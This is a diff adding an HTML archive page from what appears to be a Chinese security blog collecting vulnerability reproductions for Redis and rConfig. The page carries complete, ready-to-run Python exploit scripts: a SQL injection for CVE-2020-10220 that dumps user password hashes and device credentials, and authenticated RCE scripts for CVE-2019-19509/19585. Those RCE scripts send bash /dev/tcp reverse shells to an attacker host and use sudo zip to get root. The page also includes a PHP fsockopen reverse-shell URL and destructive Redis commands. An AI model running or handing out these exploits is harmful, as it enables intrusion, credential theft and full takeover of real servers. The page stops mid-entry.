@@ -1,0 +1,1067 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/46/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Redis/redis未授权访问漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Redis/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.244Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>redis未授权访问漏洞</p>
+<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h5 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1.环境安装"></a>1.环境安装</h5><pre><code>从官网wget到本地
+wget http://download.redis.io/releases/redis-3.2.11.tar.gz 
+tar xzf redis-3.2.11.tar.gz 
+将redis.conf copy到 /etc/下
+启动时使用命令 redis-server /etc/redis.conf
+测试时建议 vim /etc/redis.conf
+去掉ip绑定，允许除本地外的主机远程登录redis服务
+(1)bind 127.0.0.1前面加上##号注释掉 或者更改成 0.0.0.0
+(2)protected-mode设为no
+</code></pre>
+<p>如图<br><img src="/resource/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId25.png"><img src="/resource/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<h5 id="2-攻击者常用命令"><a href="#2-攻击者常用命令" class="headerlink" title="2.攻击者常用命令"></a>2.攻击者常用命令</h5><pre><code>    （1）info                       查看信息     
+    （2）flushall                 删除所有数据库内容：
+    （3）flushdb                    刷新数据库
+    （4）看所有键：KEYS *，使用select num可以查看键值数据。
+    （5）set test &quot;who am i&quot;        设置变量
+    （6）config set dir dirpath     设置路径等配置
+    （7）config get dir/dbfilename  获取路径及数据配置信息
+    （8）save                       保存
+    （9）get                        变量，查看变量名称
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Redis/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Redis/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qv7300fny8v1ci1g2n8v" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-rConfig/（CVE-2020-10220）rConfig v3.9.4 sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/rConfig/%EF%BC%88CVE-2020-10220%EF%BC%89rConfig%20v3.9.4%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.204Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-10220）rConfig-v3-9-4-sql注入漏洞"><a href="#（CVE-2020-10220）rConfig-v3-9-4-sql注入漏洞" class="headerlink" title="（CVE-2020-10220）rConfig v3.9.4 sql注入漏洞"></a>（CVE-2020-10220）rConfig v3.9.4 sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>rConfig是一款开源的网络配置管理实用程序。 rConfig<br>3.9.4及之前版本中存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>rConfig v3.9.4</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
+<p>CVE-2020-10220.py</p>
+</blockquote>
+<pre><code># Exploit Title: rConfig 3.9 - SQL injection
+# Date: 2020-03-03
+# CVE-2020-10220
+# Exploit Author: vikingfr
+# Exploit link : https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2020-10220.py
+# Vendor Homepage: https://rconfig.com/ (see also : https://github.com/rconfig/rconfig)
+# Software Link : https://www.rconfig.com/downloads/rconfig-3.9.4.zip
+# Install scripts  : 
+# https://www.rconfig.com/downloads/scripts/install_rConfig.sh
+# https://www.rconfig.com/downloads/scripts/centos7_install.sh
+# https://www.rconfig.com/downloads/scripts/centos6_install.sh
+# Version: tested v3.9.4
+# Tested on: Apache/2.4.6 (CentOS 7.7) OpenSSL/1.0.2k-fips PHP/7.2.24
+#
+# Notes : If you want to reproduce in your lab environment follow those links :
+# http://help.rconfig.com/gettingstarted/installation
+# then
+# http://help.rconfig.com/gettingstarted/postinstall
+#
+# $ python3 rconfig_sqli.py https://1.1.1.1
+# rconfig 3.9 - SQL Injection PoC
+# [+] Triggering the payloads on https://1.1.1.1/commands.inc.php
+# [+] Extracting the current DB name :
+# rconfig2
+# [+] Extracting 10 first users :
+# admin:1:63a9f0ea7bb98050796b649e85481845
+# Maybe no more information ?
+# Maybe no more information ?
+# [snip]
+# [+] Extracting 10 first devices :
+# 127-0-0-1:127.0.0.1::ocdvulnpass:
+# deviceTestName:1.1.1.1:myusertest:mysecret:myenablesecret
+# Maybe no more information ?
+# Maybe no more information ?
+# [snip]
+# Done
+ 
+
+#!/usr/bin/python3
+import requests
+import sys
+import urllib.parse
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+print (&quot;rconfig 3.9 - SQL Injection PoC&quot;)
+if len(sys.argv) != 2:
+    print (&quot;[+] Usage : ./rconfig_exploit.py https://target&quot;)
+    exit()
+
+vuln_page=&quot;/commands.inc.php&quot;
+vuln_parameters=&quot;?searchOption=contains&amp;searchField=vuln&amp;search=search&amp;searchColumn=command&quot;
+given_target = sys.argv[1]
+target =  given_target
+target += vuln_page
+target += vuln_parameters
+
+request = requests.session()
+dashboard_request = request.get(target+vuln_page, allow_redirects=False, verify=False)
+
+
+def extractDBinfos(myTarget=None,myPayload=None):
+    &quot;&quot;&quot;
+    Extract information from database
+    Args:
+        - target+payload (String)
+    Returns:
+        - payload result (String)
+    &quot;&quot;&quot;
+    result = &quot;&quot;
+    encoded_request = myTarget+myPayload
+    exploit_req = request.get(encoded_request)
+    if &#39;[PWN]&#39; in str(exploit_req.content):
+        result = str(exploit_req.content).split(&#39;[PWN]&#39;)[1]
+    else:
+        result=&quot;Maybe no more information ?&quot;
+    
+    return result
+
+
+if dashboard_request.status_code != 404:
+    print (&quot;[+] Triggering the payloads on &quot;+given_target+vuln_page)
+    # get the db name
+    print (&quot;[+] Extracting the current DB name :&quot;)
+    db_payload = &quot;%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,database(),0x5B50574E5D3C42523E)%20limit%200,1),NULL--&quot;
+    db_name = extractDBinfos(target,db_payload)
+    print (db_name)
+    # DB extract users
+    print (&quot;[+] Extracting 10 first users :&quot;)
+    for i in range (0, 10):
+            user1_payload=&quot;%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,username,0x3A,id,0x3A,password,0x5B50574E5D3C42523E)%20FROM%20&quot;+db_name+&quot;.users+limit+&quot;+str(i)+&quot;,&quot;+str(i+1)+&quot;),NULL--&quot;
+            user_h = extractDBinfos(target,user1_payload)
+            #print (&quot;[+] Dump device &quot;+str(i))
+            print (user_h)
+    # DB extract devices information
+    print (&quot;[+] Extracting 10 first devices :&quot;)
+    for i in range (0, 10):
+            device_payload=&quot;%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,deviceName,0x3A,deviceIpAddr,0x3A,deviceUsername,0x3A,devicePassword,0x3A,deviceEnablePassword,0x5B50574E5D3C42523E)%20FROM%20&quot;+db_name+&quot;.nodes+limit+&quot;+str(i)+&quot;,&quot;+str(i+1)+&quot;),NULL--&quot;
+            device_h = extractDBinfos(target,device_payload)
+            #print (&quot;[+] Dump device &quot;+str(i))
+            print (device_h)
+    
+    print (&quot;Done&quot;)
+                   
+else:
+    print (&quot;[-] Please verify the URI&quot;)
+    exit()
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/rConfig/%EF%BC%88CVE-2020-10220%EF%BC%89rConfig%20v3.9.4%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/rConfig/%EF%BC%88CVE-2020-10220%EF%BC%89rConfig%20v3.9.4%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qv7200fmy8v13xe766gy" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-rConfig/（CVE-2019-19585）rConfig v3.9.3 本地权限提升漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/rConfig/%EF%BC%88CVE-2019-19585%EF%BC%89rConfig%20v3.9.3%20%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.202Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-19585）rConfig-v3-9-3-本地权限提升漏洞"><a href="#（CVE-2019-19585）rConfig-v3-9-3-本地权限提升漏洞" class="headerlink" title="（CVE-2019-19585）rConfig v3.9.3 本地权限提升漏洞"></a>（CVE-2019-19585）rConfig v3.9.3 本地权限提升漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>rConfig是一款开源的网络配置管理实用程序。 rConfig<br>3.9.3版本中存在安全漏洞。攻击者可利用该漏洞绕过本地安全限制。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>rConfig v3.9.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这个漏洞需要CVE-2019-19509 + CVE-2019-19585相配合才能深入利用</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
+<p>CVE-2019-19585.py</p>
+</blockquote>
+<pre><code># Exploit Title: rConfig &lt;= 3.9.3 - Authenticated Remote Code Execution - root
+# Date: 2019-11-07
+# CVE-2019-19509 + CVE-2019-19585
+# Exploit Author: vikingfr
+# Ref : https://raw.githubusercontent.com/v1k1ngfr/exploits-rconfig/master/rconfig_root_RCE.py
+# Vendor Homepage: https://rconfig.com/ (see also : https://github.com/rconfig/rconfig)
+# Software Link : http://files.rconfig.com/downloads/scripts/centos7_install.sh
+# Version: tested v3.9.3
+# Tested on: Apache/2.4.6 (CentOS 7.7) OpenSSL/1.0.2k-fips PHP/7.2.24
+#
+# Notes : If you want to reproduce in your lab environment follow those links :
+# http://help.rconfig.com/gettingstarted/installation
+# then
+# http://help.rconfig.com/gettingstarted/postinstall
+#
+# $ python3 exploit.py https://192.168.43.34 admin root 192.168.43.245 4444
+# rconfig - CVE-2019-19509 + CVE-2019-19585 - Web authenticated RCE - root
+# [+] Logged in successfully, triggering the payload...
+# [+] Check your listener !
+# ...
+# $ nc -nvlp 4444
+# listening on [any] 4444 ...
+# connect to [192.168.43.245] from (UNKNOWN) [192.168.43.34] 34458
+# sh: no job control in this shell
+# sh-4.2# id
+# id
+# uid=0(root) gid=0(root) groups=0(root)
+# sh-4.2#
+
+#!/usr/bin/python3
+
+import requests
+import sys
+import urllib.parse
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+print (&quot;rconfig - CVE-2019-19509 + CVE-2019-19585 - Web authenticated RCE - root&quot;)
+
+if len(sys.argv) != 6:
+    print (&quot;[+] Usage : ./rconfig_exploit.py https://target username password yourIP yourPort&quot;)
+    exit()
+
+target = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+ip = sys.argv[4]
+port = sys.argv[5]
+#payload = &#39;&#39;&#39;`bash -i&gt;&amp; /dev/tcp/&#123;0&#125;/&#123;1&#125; 0&gt;&amp;1`&#39;&#39;&#39;.format(ip, port)
+# root RCE payload, including CVE-2019-19585
+payload = &#39;&#39;&#39; `touch /tmp/CVE-2019-19585.txt;sudo zip -q /tmp/LPE.zip /tmp/CVE-2019-19585.txt -T -TT &#39;/bin/sh -i&gt;&amp; /dev/tcp/&#123;0&#125;/&#123;1&#125; 0&gt;&amp;1 #&#39;` &#39;&#39;&#39;.format(ip, port)
+
+request = requests.session()
+
+login_info = &#123;
+    &quot;user&quot;: username,
+    &quot;pass&quot;: password,
+    &quot;sublogin&quot;: 1
+&#125;
+
+login_request = request.post(
+    target+&quot;/lib/crud/userprocess.php&quot;,
+     login_info,
+     verify=False,
+     allow_redirects=True
+ )
+
+dashboard_request = request.get(target+&quot;/dashboard.php&quot;, allow_redirects=False)
+
+if dashboard_request.status_code == 200:
+    print (&quot;[+] Logged in successfully, triggering the payload...&quot;)
+    encoded_request = target+&quot;/lib/ajaxHandlers/ajaxArchiveFiles.php?path=&#123;0&#125;&amp;ext=random&quot;.format(urllib.parse.quote(payload))
+    print (&quot;[+] Check your listener !&quot;)
+    exploit_req = request.get(encoded_request)
+
+elif dashboard_request.status_code == 302:
+    print (&quot;[-] Wrong credentials !&quot;)
+    exit()
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/rConfig/%EF%BC%88CVE-2019-19585%EF%BC%89rConfig%20v3.9.3%20%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/rConfig/%EF%BC%88CVE-2019-19585%EF%BC%89rConfig%20v3.9.3%20%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qv7100fky8v10oixbmbj" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-rConfig/（CVE-2019-19509）rConfig v3.9.3 后台远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/rConfig/%EF%BC%88CVE-2019-19509%EF%BC%89rConfig%20v3.9.3%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.199Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-19509）rConfig-v3-9-3-后台远程命令执行漏洞"><a href="#（CVE-2019-19509）rConfig-v3-9-3-后台远程命令执行漏洞" class="headerlink" title="（CVE-2019-19509）rConfig v3.9.3 后台远程命令执行漏洞"></a>（CVE-2019-19509）rConfig v3.9.3 后台远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>rConfig是一款开源的网络配置管理实用程序。 rConfig<br>3.9.3版本中存在安全漏洞，该漏洞源于程序没有进行过滤就直接将’path’参数传输到’exec’函数。远程攻击者可通过向ajaxArchiveFiles.php文件发送GET请求利用该漏洞执行系统命令。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>rConfig v3.9.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>python3 CVE-2019-19509.py https://192.168.43.34 admin root 192.168.43.245 8081
+# rconfig - CVE-2019-19509 - Web authenticated RCE
+# [+] Logged in successfully, triggering the payload...
+# [+] Check your listener !
+# ...
+# $ nc -nvlp 8081
+# listening on [any] 8081 ...
+# connect to [192.168.43.245] from (UNKNOWN) [192.168.43.34] 34458
+# bash: no job control in this shell
+# bash-4.2$ id
+# id
+# uid=48(apache) gid=48(apache) groups=48(apache)
+# bash-4.2$ 
+</code></pre>
+<blockquote>
+<p>CVE-2019-19509.py</p>
+</blockquote>
+<pre><code>#!/usr/bin/python3
+
+# Exploit Title: rConfig &lt;= v3.9.3 Authenticated Remote Code Execution
+# Date: 07/11/2019
+# CVE-2019-19509
+# Exploit Author: vikingfr
+# Vendor Homepage: https://rconfig.com/ (see also : https://github.com/rconfig/rconfig)
+# Software Link : http://files.rconfig.com/downloads/scripts/centos7_install.sh
+# Version: tested v3.9.3
+# Tested on: Apache/2.4.6 (CentOS 7.7) OpenSSL/1.0.2k-fips PHP/7.2.24
+#
+# Notes : If you want to reproduce in your lab environment follow those links :
+# http://help.rconfig.com/gettingstarted/installation
+# then
+# http://help.rconfig.com/gettingstarted/postinstall
+
+import requests
+import sys
+import urllib.parse
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+print (&quot;rconfig - CVE-2019-19509 - Web authenticated RCE&quot;)
+
+if len(sys.argv) != 6:
+    print (&quot;[+] Usage : ./rconfig_exploit.py https://target username password yourIP yourPort&quot;)
+    exit()
+
+target = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+ip = sys.argv[4]
+port = sys.argv[5]
+payload = &#39;&#39;&#39;`bash -i&gt;&amp; /dev/tcp/&#123;0&#125;/&#123;1&#125; 0&gt;&amp;1`&#39;&#39;&#39;.format(ip, port)
+
+request = requests.session()
+
+login_info = &#123;
+    &quot;user&quot;: username,
+    &quot;pass&quot;: password,
+    &quot;sublogin&quot;: 1
+&#125;
+
+login_request = request.post(
+    target+&quot;/lib/crud/userprocess.php&quot;,
+     login_info,
+     verify=False,
+     allow_redirects=True
+ )
+
+dashboard_request = request.get(target+&quot;/dashboard.php&quot;, allow_redirects=False)
+
+if dashboard_request.status_code == 200:
+    print (&quot;[+] Logged in successfully, triggering the payload...&quot;)
+    encoded_request = target+&quot;/lib/ajaxHandlers/ajaxArchiveFiles.php?path=&#123;0&#125;&amp;ext=random&quot;.format(urllib.parse.quote(payload))
+    print (&quot;[+] Check your listener !&quot;)
+    exploit_req = request.get(encoded_request)
+
+elif dashboard_request.status_code == 302:
+    print (&quot;[-] Wrong credentials !&quot;)
+    exit()
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/rConfig/%EF%BC%88CVE-2019-19509%EF%BC%89rConfig%20v3.9.3%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/rConfig/%EF%BC%88CVE-2019-19509%EF%BC%89rConfig%20v3.9.3%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qv8400fqy8v131146x5k" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-rConfig/（CVE-2019-16662）（CVE-2019-16663）rConfig v3.9.2 远程命令执行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/rConfig/%EF%BC%88CVE-2019-16662%EF%BC%89%EF%BC%88CVE-2019-16663%EF%BC%89rConfig%20v3.9.2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.195Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-16662）（CVE-2019-16663）rConfig-v3-9-2-远程命令执行"><a href="#（CVE-2019-16662）（CVE-2019-16663）rConfig-v3-9-2-远程命令执行" class="headerlink" title="（CVE-2019-16662）（CVE-2019-16663）rConfig v3.9.2 远程命令执行"></a>（CVE-2019-16662）（CVE-2019-16663）rConfig v3.9.2 远程命令执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>我在两个文件中分别发现了两个远程代码执行漏洞。第一个是ajaxServerSettingsChk.php，攻击者可以通过rootUname参数发送精心构造的一个GET请求，触发未授权RCE漏洞。rootUname参数在源文件第2行中定义，随后会在第13行传递给exec函数，攻击者可以构造参数接收内容实现让操作系统执行恶意命令。这个漏洞很容易利用和发现,后面的篇幅中我将介绍如何发现并利用这个漏洞。</p>
+<p>第二个漏洞是在search.crud.php发现的，这文件需要通过身份验证才能触发远程代码执行漏洞。这个漏洞可以通过构造一个包含有两个参数的GET请求触发，其中searchTerm参数可以包含任意值，但该参数必须存在，才能执行到第63行的exec函数。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>rConfig v3.9.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>https://www.0-sec.org/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=`php -r &#39;$sock=fsockopen(&quot;1.2.3.4&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;`
+</code></pre>
+<p><img src="/resource/(CVE-2019-16662)(CVE-2019-16663)rConfigv3.9.2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId24.png"></p>
+<p>pyton脚本一</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/rConfig/%EF%BC%88CVE-2019-16662%EF%BC%89%EF%BC%88CVE-2019-16663%EF%BC%89rConfig%20v3.9.2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/rConfig/%EF%BC%88CVE-2019-16662%EF%BC%89%EF%BC%88CVE-2019-16663%EF%BC%89rConfig%20v3.9.2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cl5c2qv7300foy8v101gcgmbe" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-rConfig/rConfig v3.9.6 远程命令执行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/rConfig/rConfig%20v3.9.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.193Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="rConfig-v3-9-6-远程命令执行"><a href="#rConfig-v3-9-6-远程命令执行" class="headerlink" title="rConfig v3.9.6 远程命令执行"></a>rConfig v3.9.6 远程命令执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>rConfig是”开源网络设备配置管理实用程序，可对设备进行频繁的配置快照。开源，由Network<br>Architects构建-我们知道您的需求！”</p>
+<p>rConfig远程未经身份验证的RCE中的两个漏洞。一个漏洞允许未经身份验证的用户进行身份验证，另一个漏洞（身份验证后）允许攻击者执行任意代码。</p>
+<p>厂商最初的反应非常迅速，并且立刻发布了一个更新版本（v3.9.6），我们最初是在v3.9.5上验证了该漏洞。但是我们发现，v3.9.6版本中同样存在安全漏洞，并将此情况反应给了厂商。目前为止，我们还不知道有没有安全补丁能够解决或缓解这两个漏洞所带来的影响。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>rConfig v3.9.6 及其之前版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
+<p>rConfig.py 需要修改代码里面的部分内容</p>
+</blockquote>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/rConfig/rConfig%20v3.9.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/rConfig/rConfig%20v3.9.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cl5c2qv7100fly8v1aozi4ptm" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-RaspAP/（CVE-2020-24572）RaspAP 2.5 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
